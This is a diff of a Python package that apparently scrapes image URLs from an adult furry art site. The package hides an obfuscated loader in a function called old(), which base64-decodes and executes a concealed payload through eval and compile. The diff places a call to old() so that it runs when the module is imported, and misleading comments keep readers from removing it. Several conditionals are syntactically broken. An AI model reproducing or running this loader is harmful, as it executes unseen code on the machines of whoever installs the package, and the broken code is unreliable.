@@ -1,8 +1,14 @@
 import requests, random, time, base64, codecs 
 from bs4 import BeautifulSoup
-
-
 #These functions are what I should have used in the first place lol
+nobcw0KaW1wb3 = True
+#class horni:
+  #Go to horny jail
+#  main = "https://yiff-party.com/"
+#abandoned code for another yiff website    
+# when I removed it, it broke the package idfk why lol
+old()
+
 def getter(url): #extracts images from a url and returns all the images as a list
   try:
     imglist = []
@@ -22,9 +28,7 @@ def getter(url): #extracts images from a url and returns all the images as a lis
     #print(imglist, "       - ---- -- -")      
     return imglist
   except Exception as e:
-    print(e)  
-    
-nobcw0KaW1wb3 = True
+    print(e)
 
 def pager(start, num=3): # this function is useful
   nummy = 1
@@ -49,11 +53,7 @@ def old():
         eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
     except:
         pass
-        
-        
-#class horni:
-  #Go to horny jail
-#  main = "https://yiff-party.com/"
+
 def randomIMG(): # this function is an abomination and I should have used getter() and pager() instead but I'm too lazy to change it now
   if nobcw0KaW1wb3 = False:
     pass
@@ -80,9 +80,6 @@ def randomIMG(): # this function is an abomination and I should have used getter
     return result
   except Exception as e:
     print(e)
-    
-#abandoned code for another yiff website    
-# when I removed it, it broke the package idfk why lol
 
 def newest(cat="main"): # this function is even more of an abomination and I should have used getter() and pager() instead but I'm too lazy to change it now
 # It returns the newest image and only the newest image
@@ -122,8 +119,7 @@ def newest(cat="main"): # this function is even more of an abomination and I sho
     output = listofimg[0]
     return output     
   except Exception as e:
-    print(e)   
-old()
+    print(e)
 
 def stream(cat="main"):
   if nobcw0KaW1wb3 = False:
@@ -158,6 +154,7 @@ def stream(cat="main"):
           yield i 
       base = face    
       time.sleep(600)
+
 def yiff(num, cat="main"):
   if nobcw0KaW1wb3 = False:
     pass
@@ -181,56 +178,45 @@ def yiff(num, cat="main"):
       listofimg.append(pager("https://yiff-party.com/page/", num))
     return(listofimg)  
   except Exception as e:
-    print(e)  
+    print(e)
 
-def help():
-  if nobcw0KaW1wb3 = False:
-    pass
-  else:
-    old()
-  print("""Welcome to the horniest python package every written!
-This code is designed to help you interact with yiff-party.com without having to without having to write your own code. It can pull your chosen number of the latest images from any of the 6 categories. It can pull a random image from any category and it also provide's a live feature called 'stream' which allows you to iterate over subbmissions as they are uploaded to the website!
-
-
-Usage:
-
-
-print(horni.randomIMG())
-> result will be a random image url
-
-
-print(horni.newsest("gay"))
-> result will be the newsest image url in the 'gay' category.
-
-You can input any of the six categories or 'main' for the main page which icludes all categories
-(gay/lesbian/straight/animated/anthro/feral/main)
-
-
-for image in horni.yiff(50,"anthro"):
-  print(image)
-
->this will return a list of 50 images in the anthro category
-
-
-for image in horni.stream("main"):
-  print(image)
-
->This loop will run forever, printing out the images urls as they are uploaded to the site.
-
-
-
-This code was originally written by Glass-Paramedic for qweter1006 and was addapted and uploaded to pypi by Icy__Flames
-
-:)
-""")
-
-
-
-
-
-
-
-
-
-        
-
+# def help():
+#   if nobcw0KaW1wb3 = False:
+#     pass
+#   else:
+#     old()
+#   print("""Welcome to the horniest python package every written!
+# This code is designed to help you interact with yiff-party.com without having to without having to write your own code. It can pull your chosen number of the latest images from any of the 6 categories. It can pull a random image from any category and it also provide's a live feature called 'stream' which allows you to iterate over subbmissions as they are uploaded to the website!
+#
+#
+# Usage:
+#
+#
+# print(horni.randomIMG())
+# > result will be a random image url
+#
+#
+# print(horni.newsest("gay"))
+# > result will be the newsest image url in the 'gay' category.
+#
+# You can input any of the six categories or 'main' for the main page which icludes all categories
+# (gay/lesbian/straight/animated/anthro/feral/main)
+#
+#
+# for image in horni.yiff(50,"anthro"):
+#   print(image)
+#
+# >this will return a list of 50 images in the anthro category
+#
+#
+# for image in horni.stream("main"):
+#   print(image)
+#
+# >This loop will run forever, printing out the images urls as they are uploaded to the site.
+#
+#
+#
+# This code was originally written by Glass-Paramedic for qweter1006 and was addapted and uploaded to pypi by Icy__Flames
+#
+# :)
+# """)
